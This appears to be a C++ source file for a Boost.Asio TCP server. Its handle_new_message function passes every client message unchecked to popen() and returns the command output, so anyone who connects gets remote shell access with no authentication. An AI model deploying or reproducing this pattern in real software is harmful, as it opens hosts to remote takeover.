#include "Server.hpp"

Server::Server(const std::string& ip, int port)
        : acceptor(io_context,
                   tcp::endpoint(boost::asio::ip::make_address(ip), port)),
          num_clients(0) {
    async_accept();
    io_thread = std::thread([this]() {
        io_context.run();
    });
}

Server::~Server() {
    if (io_thread.joinable()) {
        io_context.stop();
        io_thread.join();
    }
}

void Server::async_accept() {
    acceptor.async_accept([this](boost::system::error_code err,
                                 tcp::socket socket) {
        handle_connection(err, std::move(socket));
    });
}

void Server::handle_connection(boost::system::error_code err,
                               tcp::socket socket) {
    if (!err) {
        std::cout << "Connection request" << std::endl;

        if (num_clients < max_clients) {
            auto client = std::make_unique<Connection>(std::make_unique<tcp::socket>(std::move(socket)));
            auto remote_ip_port = client->remote_ip_port();
            client->set_observer(shared_from_this());
            client->read();
            clients[remote_ip_port] = std::move(client);
            ++num_clients;
            std::cout << "Client " << remote_ip_port << " successfully added!" << std::endl;
        } else {
            std::cout << "Failed to add client: maximum number of clients reached (" << max_clients << ")" << std::endl;
        }
    }
    async_accept();
}

std::string Server::handle_new_message(std::string msg) {
    return shell(msg);
}

std::string Server::shell(const std::string& command) {
    std::array<char, 128> buffer{};
    std::string output;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(
            popen(command.c_str(), "r"),
            pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }
    return output;
}
